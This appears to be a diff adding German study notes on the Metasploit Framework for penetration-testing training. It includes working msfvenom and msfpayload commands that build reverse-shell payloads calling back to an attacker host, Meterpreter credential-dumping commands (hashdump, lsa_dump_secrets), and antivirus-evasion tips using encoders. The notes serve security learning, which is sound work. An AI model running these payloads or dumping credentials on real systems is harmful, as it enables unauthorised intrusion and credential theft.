@@ -1,0 +1,297 @@
+Using the Metasploit Framework
+Introduction
+1. Preface:
+- All Methoden manuell zu beherschen ist wichtig, trotzdem ist es notwendig sich mit automatisierten Werkzeugen zu beherschen
+- Auf automatisierte Werkzeuge sollte sich nicht verlassen werden, weil dadurch nicht outside the box gedacht wird 
+
+2. Introduction to Metasploit:
+- Das Metasploit ist mit Ruby geschrieben, und ermoeglicht es einen Exploit auszufuehren
+- Der Exploit Code sind custom-made Exploits in einer Datenbank
+- Mit dem Metasploit Framework koennen Sicherheits Schwachstellen, Network Enumerierung, Angriffe, Entdeckung entgehen ausgefuehrt werden
+
+- Metasploit Pro:
+	- Fuer Metasploit gibt es zwei Versionen eine Pro und eine normale Version
+	- Die Pro Version hat folgende Features:
+		- Task Chains
+		- Social Engineering
+		- Vulnerability Validations
+		- GUI/ Pro ist aber auch von der command line verfuegbar
+		- Quick Start Wizards
+		- Nexpose Integration
+
+- Metasploit Framework Console:
+	- msfconsole ist das beliebteste Framework von Metasploit Framework(MSF)
+
+3. Introduction to MSFconsole:
+- Mit "msfconsole" wird im Terminal das Metasploit Framework geoeffnet
+- Kali und Parrot kommen mit msfconsole vorinstalliert
+- Mit "help" koennen alle Befehle ausgegeben werden
+- Mit "sudo apt update && sudo apt install metasploit-framework" wird as Metasploit Framework installiert
+
+- MSF Engagement Structure:
+	- Die Struktur von MSF Engagements kann in 5 Kategorien unterteilt werden:
+		- Enumeration
+		- Preperation
+		- Exploitation
+		- Privilege Escalation
+		- Post-Exploitation
+
+####################################################################################################
+MSF Components
+1. Modules:
+- Metasploit Module sind vorbereitete Scripts mit bestimmten Zweck 
+- Die Syntax von Modulen ist <Nummer> <Type>/<Betriebssystem>/<Service>/<Name>
+	- Type:
+		- Ist das erste Level der Teilung von Modulen
+		- Es gibt verschiedenste Arten:
+			- Auxiliary: Scanning, fuzzing, sniffing and admin capabilities
+			- Encoders: Versichert das Exploits an ihrem Ziel in Takt ankommen
+			- Exploits: Nutzt eine Schwachstelle aus mit der Moeglichkeit fuer eine Payload
+			- NOPs: No Operation Code. Payload ist gleich auf mehreren Plattformen
+			- Payloads: Code laeuft auf Ziel und verbindet sich mit Attacker
+			- Plugins: Weitere Scripts koennen hinzugefuegt werden 
+			- Post: Sammeln von Informationen
+			- Use kann nur mit Auxiliary, Exploits, Post verwendet werden	
+	- Betriebssystem:
+		- Ist der Tag fuer das Betriebssystem
+	- Service:
+		- Tag steht fuer den gefaehrderten Dienst
+		- Fuer Auxiliary/Post kann dass eine allgemeine Aktivitaet sein wie gather
+	- Name:
+		- Der Name erklaert welche Aktion das Modul durchfuehrt
+
+-Searching for Modules:
+	- Mit <help search> kann die Hilfe fuer die search Funktin ausgegeben werden
+	- Mit <run/exploit> kann der Angriff gestartet werden
+
+2. Targets:
+- Targets sind um eindeutige Betriebssystemerkennungen die aus der Version des Betriebsystems entnommen werden und die das Exploit Modul an diese Version anpassen
+- Mit <info> koennen mehr Informationen zu diesem spezifischem Modul ausgegeben werden
+- Wenn wir in Optionen kein target setzten fuellt msfconsole den Tag automatisch aus
+- <Show targets> zeigt an welche Ziele fuer das Exploit Modul infrage kommen
+
+3. Payloads:
+- Eine Payload in Metasploit ist ein Modul eine Shell an den Angreifer zu geben
+- Die Payload wird zusammen mit dem Exploit welches Standardfunktionen und anfaellige Services umgeht geladen
+- Es gibt drei verschiedene Arten von Payload Modules in Metasploit:
+	- Singles
+	- Stagers
+	- Stages
+- Ob eine Payload gestaged ist erkennt man am / im Payloadnamen
+- windows/shell_bind_tcp ist eine single Payload ohne stage
+- windows/shell/bind_tcp ist ein staged Payload mit dem stager bind_tcp und dem stager shell
+
+- Singles:
+	- Eine Single Payload enthaelt den gesamten Quellcode
+	- Single Payload sind per design mehr stabil
+
+- Stagers:
+	- Eine Stager Payload wartet auf den Angreifer um die Verbindung zu ettablieren
+	- Diese Verbindung ist meistens fuer kleinere Sachen besser und sehr stabil
+
+- Stages:
+	- Stages sind Payload Komponenten die vom Stager Modul heruntergeladen werden
+	- Die Stages haben keine Groessenlimits und bieten erweiterte Features
+	- Payload Stages verwenden automatisch middle stagers
+
+Staged Payloads:
+	- Ist eine modulare und nach Funktionen seperierter Prozess
+	- Die Payloads sind so simple wie nur moeglich um Antivirus und Intrusion Prevention Systems zu umgehen
+	- Stage0 der Staged Payloads repraesentiert den initalen shellcode wie reverse_tcp, reverse_https, bind_tcp usw
+	- Mit show Payloads koenen die Payloads angezeigt werden
+
+- Searching for Payloads:
+	- Um eine Payload auszuwaehlen muessen wir zuerst wissen war wir machen wollen
+	- Wir koennen die Payloads mit Plugins wie Mimikatz verbinden um mehr Informationen zu bekommen
+	- Mit <show payloads> koennen alle Payloads ausgegeben werden
+	- Sollte der Payload den wir benoetigen nicht dabei sein koennen wir mit msfvenom einen neuen Payload erzeugen
+	- Wir koennen auch mit grep die Output in Metasploit filtern
+	- grep meterpreter show payloads zeigt nur meterpreter payloads an
+
+- Selecting Payloads:
+	- Wir koennen den Payloads mit <set payload <Nummer> setzen
+	- Auch hier koennen Optionen gesetzt werden
+
+4. Encoders:
+- Encoders machen die Payload fuer die verschiedensten Prozessor Architekturen kompatibel
+- Shikata Ga Nai(SGN) ist eines der meist genutzten Encoding Schemas um eine Payload zu erkennen
+
+- Selecting an Encoder:
+	- Wenn wir unseren Payload konfigurieren wollen sollten wir msfpayload verwenden
+	- Mit msfencode encoden wir unsere Payload fuer das jeweilige Betriebssystem
+	- Die beiden BEfehle koennen miteinander verbunden werden:
+		- msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
+	- Mit <showencoders> koennen sich alle encoder angezeigt werden
+
+- Mit https://www.virustotal.com/gui/home/upload kann der Virus bewertet werden
+- Metasploit hat ein eigenes Tool namens msf-virustotal mit dem ein Virus bewertet werden kann
+
+5. Databases:
+- Datenbanken in msfconsole tracken die Ergebnisse
+- Msfconsole hat einen eingebautet Support fuer PostgreSQL mit dem die Scans importiert und exportiert werden koennen
+- Start PostgreSQL:
+	- sudo systemctl start postgresql
+
+- MSF-Database:
+	- sudo msfdb init
+	- Manchmal kann es zu einem Error kommen hier einfach Metasploit updaten mit <apt update>
+	- Mit <sudo msfdb status> wird der Status abgefragt 
+	- Mit Workspaces kann fuer jedes Target eine eigenen Workspace angelegt werden
+
+	- Importing Scan Results:
+		- Wenn Nmap Scans als .xml gespeichert wurden koennen sie in msfconsole mit db_import importiert werden
+	
+	- Nmap inside MSFconsole:
+		- Nmap kann innerhalb von MSFconsole ausgefuehrt werden
+		- db_nmap -sV -sS 10.192.123.12
+
+	- Daten:
+		- Die Dtaen koennen mit db_export exportiert werden
+		- Mit db_export -f XML export.xml
+		- Die Daten koennen wieder importiert werden
+		- In den Daten koennen nach Hosts, Services, Credentials, usw gesucht werden
+
+6. Plugins & Mixins:
+- Plugin sind Software die in Metasploit integriert wurden aber von Drittanbietern kommen
+
+- Using Plugins:
+	- Die Plugins befinden sich in /usr/share/metasploit-framework/plugins
+	- Mit <load "Plugin_Name">
+
+- Installing new Plugins:
+	- Um ein neues Plugin zu installieren muessen wir zunaechst das plugin per github etc downloaden
+	- Dann die rb Datei in das Plugin Verzeichnis von Metasploit kopieren
+	- Dann MSFconsole oeffnen und mit load das Plugin laden
+	- Beliebte Plugins sind:
+		- nMap, NexPose, Nessus, Minikatz, Stdapi, Railgun, Priv, Incoginito, Darkoperator's
+
+###################################################################################################
+MSF Sessions
+1. Sessions & Jobs:
+- Mit Sessions koennen mehrere module gleichzeitig ausgefuehrt werden
+
+- Using Sessions:
+	- Wenn ein exploit ausgefuehrt wird kann mit [CTRL] + [Z] die Session in den Hintergrund geschoben werden
+	- Mit <sessions> koennen alle aktiven Sessions angezeigt werden
+	- Mit <session -i [Nummer]> kann eine Session geoffnet werden
+
+	- Jobs:
+		- Wenn wir einen aktiven exploit unter einem Port verwenden kann die Session nicht in den Hintergrund geschoben werden
+		- Mit Jobs koennen die aktiven Tasks die im Hintergrund laufen angezeigt und terminiert werden
+		- Wir koennen ein exploit mit <exploit -h> als Job starten
+		- Mit <jobs -l> koennen alle laufenden Jobs aufgelistet werden
+		- Mit <kil [index_Nummer]> kann ein Job beendet werden
+		- Mit <jobs -K> koennen alle Jobs beendet werden
+
+2. Meterpreter:
+- Meterpreter Payload ist ein spezifischer ist erweiterte Payload welches DDL injection verwendet, die dem Angreifer eine Shell zurueckgibt
+- Es hinterlaesst keine Spur auf der Festplatte
+- Um Antivirus zu umgehen https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion/
+
+- Running Meterpreter:
+	- Mit <show payloads> koennen alle Payloads angezeigt werden
+	- stdapi und priv werden standardmaessig geladen, die Erweiterungen werden mit AES Verschluesselung geladen
+	- Mit <help> koennen alle Befehle angezeigt werden
+	- Beim hochladen der Meterpreter Payload wird eine Datei gespeichert diese wird nach dem die Shell erhalten wurde geloescht. Manchmal scheitert dieser Befehl
+	- Mit Meterpreter kann ein Token von einem anderen Prozess gestolen werden um mehr Rechte zu bekommen
+	- Mit dem dem Post <local_exploit_suggester> koennen moegliche Exploits vorgegeben werden
+	- Mit <run post/windows/gather/hashdump> koennen die Inhalte der SAM gesammtlt werden
+	- Mit dem Befehl <hashdump> wird der Inhalt der SAM Datenbank ausgegeben
+		- In der Security Account Manager(SAM) Datenbank befinden sich Anmeldenamen wie Kennworte, Hashwerte usw
+	- Mit <lsa_dump_sam> werden di User in der SAM Datenbank ausgegeben
+	- Mit <lsa_dump_secrets> werden die gehashten Keys ausgegeben
+
+###################################################################################################
+Additional Features
+1. Writing & Importing Modules:
+- Wenn wir benutzerdefinierte Exploits haben moechten ist ExploitDB eine gute Wahl
+- Mit <searchsploit> koennen wir nach koennen wir nach Exploits in ExploitDB suchen
+- Den Exploit koennen wir downloaden und dann in den exploit Ordner /usr/share/metasploit-framework/modules/exploits kopieren
+- Mit <reload_all> koennen alle installierten Module nochmal geladen werden
+
+- Porting Over Scripts into Metasploit Modules:
+	- Alle Scripts muessen in Ruby umgeschrieben muessen
+
+	- Writing our Module:
+		- Die meisten Netzwerke sind speziell angefertigt auf das jeweilige Unternehmen
+		- Um die Scripte anzupassen muessen wir die Scripte anpassen deswegen sind Ruby Kentnisse von Vorteil
+		- Hier koennen alle Informationen zu Ruby in Metasploit gefunden werden: https://www.rubydoc.info/github/rapid7/metasploit-framework
+		
+		- Proof-of-Concept - Requirements:
+			- class MetasploitModule < Msf::Exploit::Remote
+				  Rank = ExcellentRanking
+
+				  include Msf::Exploit::Remote::HttpClient
+				  include Msf::Exploit::PhpEXE
+				  include Msf::Exploit::FileDropper
+				  include Msf::Auxiliary::Report
+		
+		- Proof-of-Concept - Module Information:
+			- Hier stehen alle Informationen ueber das Modul wie Name, Beschreibung, Authort usw 
+			- def initialize(info={})
+    			super(update_info(info,
+    			...
+    			))
+
+    	- Proof-of-Concept - Functions:
+    		- Reigster_options sind die optionen fuer Eingabeoptionen
+    		- register_options(
+      		[
+      		......
+      		]) end
+
+		- Danach kommt der Hauptteil des Quellcodes
+
+2. Introduction to MSFVenom:
+- MSFVenom ist der Nachfolger von MSFPayload und MSFEncode
+- Mit MSFVenom koennen wir exploits anpasse und encoden
+
+- Generating Payload:
+	- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx -o reverse_shell.aspx
+	- Mit der Option -p wird der Payload gesetzt
+	- LHOST und LPORT sind fuer fuer den Attackhost 
+	- -f ist ist die Dateiendung 
+	- -o ist die Output Datei
+
+- Setting up Handler:
+	- Wir koennen in MSFconsole eine handler oeffnen 
+	- Mit use multi/handler koennen wir den Handler oeffnen
+	- LHOST und LPORT setzten und mit run ausfuehren
+	- Dann wird sofort ein Meterpreter Session geoffnet
+
+- Local Exploit Suggester:
+	- Das Modul namens Local Exploit Suggester schlaegt Exploits fuer einen Host vor
+	- Wenn wir eine Shell auf einem Host haben koennen wir die Seession mit <set Session [no]> setzen
+	- Die Vorschlaege koennen wir dann fuer die Shell benutzten
+
+3. Firewall and IDS/IPS evasion:
+- Es gibt zwei Hauptbegriffe:
+	- Endpoint protection
+	- Perimeter protection
+
+- Endpoint Protection:
+	- Ist ein Protection fuer ein einzelnen Host im Netzwerk
+	- Kann ein PC, Workstation oder ein Server sein
+	- Formen davon sind Antivirus, Antimalware, Firewall, Anti-DDOS
+
+- Perimeter Protection:
+	- Perimeter Protection kommen zum Einsatz in pysischen oder virtuellen Geraeten am Rande des Netzes
+	- Die Geraete am Rande gewaehren Zugang zum internen des Netzwerks von aussen auch public und private genannt
+	- Zwischen den beiden Zonen liegt die De-Militarized Zone(DMZ)
+	- Die DMZ Zone hat ein niedrigere Sicherheitslevel als die private Zone und eine hoeheres Sicherheitslevel als die public Zone
+
+- Sicherheitspolicies:
+	- Sie funktionieren wie eine ACL(Access Control List) sie erlauben oder verbieten Verkehr 
+	- Sicherheitspolicies:
+		- Signatur Erkennung
+		- Heurisitsich/Statistische Erkennung
+		- Protkollanalyse Erkennung
+		- Live-monitoring 
+
+- Evasion Techniques:
+	- Die meisten Antivirus Software basiert auf Singatur Erkennung 
+	- Diese Art von Antivirus Software kann durch Encoders umgangen werden
+	- Mit virustotal kann geprueft werden welche Antivirus Programme das Virus erkennt
+
+4. Metasploit-Framework Updates-August 2020:
+	- Aenderungen...
